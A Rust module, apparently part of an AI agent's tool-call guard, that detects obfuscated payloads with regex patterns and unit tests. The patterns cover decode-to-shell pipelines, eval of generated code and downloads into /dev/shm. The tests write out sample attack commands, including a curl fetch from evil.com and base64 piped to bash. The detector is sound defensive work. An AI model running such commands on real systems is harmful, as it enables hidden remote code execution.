//! Hidden payloads detector for Guardian N2.
//!
//! Detects obfuscated payloads hidden in tool arguments and commands:
//! - Base64 decode + execute pipelines (`echo <b64> | base64 --decode | bash`)
//! - Hex decode + execute (`echo <hex> | xxd -r | sh`)
//! - Eval of generated code (`eval "$(generate_code)"`)
//! - Multi-stage encoding (nested/sequential base64)
//! - Obfuscated argument patterns
//! - Process substitution into execution
//!
//! All regex patterns are compiled once at construction time. Detection is
//! O(n) per pattern with early-exit on severity-1.0 matches.

use regex::Regex;

use crate::openhuman::guardian::n2::types::N2Score;

/// A single hidden payload pattern with severity and description.
#[derive(Debug)]
struct PayloadPattern {
    /// Human-readable name (e.g. "b64_decode_exec", "hex_decode_exec").
    name: &'static str,
    /// Compiled regex that matches the pattern.
    regex: Regex,
    /// Severity score: 0.3 (suspicious) to 1.0 (definite payload).
    severity: f64,
    /// Description for the score reason field.
    description: &'static str,
}

impl PayloadPattern {
    fn new(name: &'static str, pattern: &str, severity: f64, description: &'static str) -> Self {
        Self {
            name,
            regex: Regex::new(pattern)
                .expect(&format!("invalid hidden payload regex: {}", pattern)),
            severity,
            description,
        }
    }
}

/// Detects hidden / obfuscated payloads in commands and tool arguments.
///
/// All regex patterns are pre-compiled at construction time. Detection is
/// O(n) per pattern — total latency well under 10ms for typical inputs.
#[derive(Debug)]
pub struct HiddenPayloadsDetector {
    /// Compiled payload patterns, ordered by descending severity.
    patterns: Vec<PayloadPattern>,
}

impl HiddenPayloadsDetector {
    /// Create a new hidden payloads detector with all patterns pre-compiled.
    pub fn new() -> Self {
        let patterns = Self::build_patterns();
        Self { patterns }
    }

    /// Build the full set of hidden payload patterns.
    fn build_patterns() -> Vec<PayloadPattern> {
        vec![
            // ── 1.0: Base64 decode + execute (pipe to shell) ────────
            PayloadPattern::new(
                "b64_decode_exec",
                r"(?:base64|b64)\s*(?:--decode|-d)\s*\|.*(?:bash|sh|eval|powershell|cmd)",
                1.0,
                "Base64 decode piped to shell execution",
            ),
            // ── 0.9: Base64 decode to executable file ───────────────
            PayloadPattern::new(
                "b64_decode_to_file",
                r"(?:base64|b64)\s*(?:--decode|-d).*>\s*\S+\.(?:exe|dll|ps1|sh|bat|vbs|py|pl)",
                0.9,
                "Base64 decode to executable file on disk",
            ),
            // ── 0.9: Hex decode + execute ───────────────────────────
            PayloadPattern::new(
                "hex_decode_exec",
                r"(?:xxd|hex).*(?:-r|--reverse)\s*\|.*(?:bash|sh|eval|powershell)",
                0.9,
                "Hex decode piped to shell execution",
            ),
            // ── 0.85: Process substitution into execution ───────────
            PayloadPattern::new(
                "proc_subst_exec",
                r"(?:bash|sh|source)\s+\$?[<(]\s*(?:cat|echo|base64|printf)",
                0.85,
                "Process substitution feeding shell execution",
            ),
            // ── 0.8: Eval of subcommand output ──────────────────────
            PayloadPattern::new(
                "eval_subcommand",
                r#"eval\s*["']\$\(|eval\s*["']`"#,
                0.8,
                "Eval of dynamically generated code",
            ),
            // ── 0.75: Encoded multi-line script ─────────────────────
            PayloadPattern::new(
                "encoded_heredoc",
                r"(?:base64|b64)\s*(?:--decode|-d)\s*<<",
                0.75,
                "Base64 decode from heredoc (inline encoded script)",
            ),
            // ── 0.7: Multi-stage encoding (double/triple base64) ────
            PayloadPattern::new(
                "multi_stage_encoding",
                r"base64.*\|.*base64.*\|.*base64",
                0.7,
                "Multi-stage/base64 encoding (triple decode pipeline)",
            ),
            // ── 0.6: Encoded string argument (long base64/hex in flags) ──
            PayloadPattern::new(
                "encoded_arg",
                r##"--\w+\s*['"]?(?:[A-Za-z0-9+/=]{40,}|\\x[0-9a-f]{2})"##,
                0.6,
                "Long encoded string passed as tool argument",
            ),
            // ── 0.5: Obfuscated download to shared memory ───────────
            PayloadPattern::new(
                "obfuscated_download",
                r"(?:curl|wget)\s+.*-o\s+/dev/shm/",
                0.5,
                "Obfuscated download to shared memory (/dev/shm)",
            ),
            // ── 0.4: Encoded string continuation detection ──────────
            PayloadPattern::new(
                "encoded_continuation",
                r##"echo\s+['"][A-Za-z0-9+/=]{40,}['"]\s*(?:>>|>)\s*\S+\.(?:py|sh)"##,
                0.4,
                "Potential encoded payload written to script file incrementally",
            ),
        ]
    }

    /// Analyse the command and argument string for hidden payload patterns.
    ///
    /// Returns `Some(N2Score)` if a pattern is detected, `None` otherwise.
    /// When multiple patterns match, the highest-severity score is returned.
    ///
    /// # Latency
    /// Patterns are evaluated in descending severity order with early-exit
    /// on severity-1.0 match. Typical execution is <1ms.
    pub fn detect(&self, command: Option<&str>, args_str: &str) -> Option<N2Score> {
        // Combine command and args for unified pattern matching.
        let haystack = match command {
            Some(cmd) => {
                let mut combined = String::with_capacity(cmd.len() + args_str.len() + 1);
                combined.push_str(cmd);
                combined.push(' ');
                combined.push_str(args_str);
                combined
            }
            None => args_str.to_string(),
        };

        let mut best_score: f64 = 0.0;
        let mut best_pattern: Option<&PayloadPattern> = None;

        for pattern in &self.patterns {
            // Early exit if we already have a 1.0 match.
            if best_score >= 1.0 - f64::EPSILON {
                break;
            }

            if pattern.regex.is_match(&haystack) {
                if pattern.severity > best_score {
                    best_score = pattern.severity;
                    best_pattern = Some(pattern);
                }

                if (pattern.severity - 1.0).abs() < f64::EPSILON {
                    break;
                }
            }
        }

        best_pattern.map(|p| {
            N2Score::new(
                p.severity,
                format!("{}: matched pattern '{}'", p.description, p.name),
                "hidden_payloads",
            )
        })
    }
}

impl Default for HiddenPayloadsDetector {
    fn default() -> Self {
        Self::new()
    }
}

// ── Tests ──────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    fn detector() -> HiddenPayloadsDetector {
        HiddenPayloadsDetector::new()
    }

    // ── 1.0: Base64 decode + execute ────────────────────────────────

    #[test]
    fn detects_b64_decode_piped_to_bash() {
        let det = detector();
        let cmd = r#"echo "SGVsbG8=" | base64 --decode | bash"#;
        let score = det.detect(Some(cmd), "");
        assert!(score.is_some(), "should detect b64 decode piped to bash");
        assert!((score.unwrap().score - 1.0).abs() < f64::EPSILON);
    }

    #[test]
    fn detects_b64_decode_piped_to_sh() {
        let det = detector();
        let cmd = r#"echo "ZmlsZQ==" | base64 -d | sh"#;
        let score = det.detect(Some(cmd), "");
        assert!(score.is_some(), "should detect b64 decode piped to sh");
    }

    #[test]
    fn detects_b64_decode_piped_to_eval() {
        let det = detector();
        let cmd = r#"echo "Y29kZQ==" | base64 -d | eval"#;
        let score = det.detect(Some(cmd), "");
        assert!(score.is_some(), "should detect b64 decode piped to eval");
    }

    // ── 0.9: Base64 decode to executable file ───────────────────────

    #[test]
    fn detects_b64_decode_to_exe() {
        let det = detector();
        let cmd = r#"echo "payload" | base64 -d > /tmp/evil.exe"#;
        let score = det.detect(Some(cmd), "");
        assert!(score.is_some(), "should detect b64 decode to .exe");
        assert!((score.unwrap().score - 0.9).abs() < f64::EPSILON);
    }

    #[test]
    fn detects_b64_decode_to_script() {
        let det = detector();
        let cmd = r#"echo "cHkgY29kZQ==" | base64 --decode > /tmp/script.py"#;
        let score = det.detect(Some(cmd), "");
        assert!(score.is_some(), "should detect b64 decode to .py");
    }

    // ── 0.9: Hex decode + execute ───────────────────────────────────

    #[test]
    fn detects_hex_decode_piped_to_bash() {
        let det = detector();
        let cmd = r#"echo "68656c6c6f" | xxd -r -p | bash"#;
        let score = det.detect(Some(cmd), "");
        assert!(score.is_some(), "should detect hex decode piped to bash");
    }

    // ── 0.8: Eval of generated code ─────────────────────────────────

    #[test]
    fn detects_eval_subcommand() {
        let det = detector();
        let cmd = r#"eval "$(generate_malicious_code)""#;
        let score = det.detect(Some(cmd), "");
        assert!(score.is_some(), "should detect eval of subcommand");
        assert!((score.unwrap().score - 0.8).abs() < f64::EPSILON);
    }

    #[test]
    fn detects_eval_backtick() {
        let det = detector();
        let cmd = r#"eval "`malicious_func`""#;
        let score = det.detect(Some(cmd), "");
        assert!(score.is_some(), "should detect eval with backticks");
    }

    // ── 0.7: Multi-stage encoding ───────────────────────────────────

    #[test]
    fn detects_double_base64() {
        let det = detector();
        let cmd = r#"echo "cGF5bG9hZA==" | base64 -d | base64 -d | sh"#;
        let score = det.detect(Some(cmd), "");
        assert!(score.is_some(), "should detect double base64 pipeline");
    }

    // ── 0.6: Encoded argument ───────────────────────────────────────

    #[test]
    fn detects_long_encoded_flag() {
        let det = detector();
        let long_b64 = "A".repeat(45);
        let args = format!("--payload '{}'", long_b64);
        let score = det.detect(None, &args);
        assert!(
            score.is_some(),
            "should detect long base64 as flag argument"
        );
    }

    #[test]
    fn detects_hex_escaped_flag() {
        let det = detector();
        let cmd = r#"--data "\x48\x65\x6c\x6c\x6f\x57\x6f\x72\x6c\x64""#;
        let score = det.detect(None, cmd);
        assert!(score.is_some(), "should detect hex-escaped flag argument");
    }

    // ── 0.5: Obfuscated download to /dev/shm ────────────────────────

    #[test]
    fn detects_curl_to_dev_shm() {
        let det = detector();
        let cmd = "curl http://evil.com/payload.sh -o /dev/shm/payload";
        let score = det.detect(Some(cmd), "");
        assert!(score.is_some(), "should detect download to /dev/shm");
    }

    // ── Benign cases (false positive prevention) ────────────────────

    #[test]
    fn benign_base64_of_png_not_detected() {
        let det = detector();
        // Legitimate base64 encoding operation (no decode/pipe to shell).
        let cmd = r#"base64 -w0 image.png > image.b64"#;
        let score = det.detect(Some(cmd), "");
        assert!(
            score.is_none(),
            "should not flag legitimate base64 encode of image"
        );
    }

    #[test]
    fn benign_echo_no_pipeline_not_detected() {
        let det = detector();
        let cmd = r#"echo "Hello, world!""#;
        let score = det.detect(Some(cmd), "");
        assert!(score.is_none(), "should not flag benign echo");
    }

    #[test]
    fn benign_eval_of_variable_not_detected() {
        let det = detector();
        let cmd = r#"eval "$variable_name""#;
        let score = det.detect(Some(cmd), "");
        assert!(
            score.is_none(),
            "should not flag direct eval of variable (no subcommand)"
        );
    }

    #[test]
    fn empty_input_returns_none() {
        let det = detector();
        assert!(det.detect(None, "").is_none());
    }

    #[test]
    fn multiple_patterns_return_highest_severity() {
        let det = detector();
        // Contains both b64 decode exec (1.0) and download to /dev/shm (0.5).
        let cmd = r#"echo "cGF5bG9hZA==" | base64 --decode | bash"#;
        let args = "curl http://evil.com/payload.sh -o /dev/shm/payload";
        let score = det.detect(Some(cmd), args);
        assert!(score.is_some());
        let s = score.unwrap();
        assert!(
            (s.score - 1.0).abs() < f64::EPSILON,
            "should return highest severity (1.0), got {}",
            s.score
        );
        assert_eq!(s.triggered_by, "hidden_payloads");
    }

    // ── Encoded heredoc ─────────────────────────────────────────────

    #[test]
    fn detects_encoded_heredoc() {
        let det = detector();
        let cmd = r#"base64 -d <<< "cGF5bG9hZA==" | bash"#;
        let score = det.detect(Some(cmd), "");
        assert!(score.is_some(), "should detect encoded heredoc pipeline");
    }

    // ── Incremental write ───────────────────────────────────────────

    #[test]
    fn detects_incremental_encoded_write() {
        let det = detector();
        let cmd = r#"echo "cGF5bG9hZCA9ICdUZXN0Jw==" >> /tmp/script.py"#;
        let score = det.detect(Some(cmd), "");
        assert!(
            score.is_some(),
            "should detect encoded write to script file"
        );
    }
}
